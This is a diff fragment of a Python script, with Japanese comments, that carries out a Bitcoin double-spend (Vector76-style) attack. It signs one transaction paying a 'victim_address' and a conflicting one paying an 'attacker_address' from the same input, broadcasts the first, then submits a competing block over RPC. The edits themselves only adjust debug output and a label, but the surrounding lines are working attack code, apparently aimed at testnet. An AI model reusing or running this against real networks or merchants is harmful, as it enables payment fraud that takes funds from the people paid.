@@ -96,7 +96,7 @@ if amount_btc < fee:
 
 change_address = transaction_util.wiftoaddr(key)
 balance = transaction_util.get_balance(change_address)["confirmed"]
-print(f"Balance (satoshi unit): {type(balance)}")
+print(f"Balance (satoshi unit): {balance}")
 
 send_amount = to_satoshi(amount_btc)
 fee = to_satoshi(fee)
@@ -104,8 +104,8 @@ change_btc_amt = (balance - (send_amount - fee)) #おつり
 tx_victim = [{"address": victim_address, "value": send_amount}, {"address": change_address, "value": change_btc_amt}]
 tx_victim = transaction_util.mktx(inputs, tx_victim)
 tx_victim["ins"][0]["prev_hash"] = last_txid
-print(tx_victim)
 tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, key))
+print(tx_victim)
 tx_attacker = [{"address": attacker_address, "value": send_amount}, {"address": change_address, "value": change_btc_amt}]
 tx_attacker = transaction_util.mktx(inputs, tx_attacker)
 tx_attacker["ins"][0]["prev_hash"] = last_txid
@@ -147,7 +147,7 @@ broadcast_transaction(tx_victim, testnet)
 
 input("--- Send the block after pressing the enter key. --- ")
 print("既に送ったトランザクションに対して強制干渉を開始...")
-print("C  V E C T O R B L  (Vector76ブロックへ変更)")
+print("C  V T W O  (V2トランサクションに変更)")
 result = rpc_node.submitblock(tx_vector76)
 print(result)
 print()
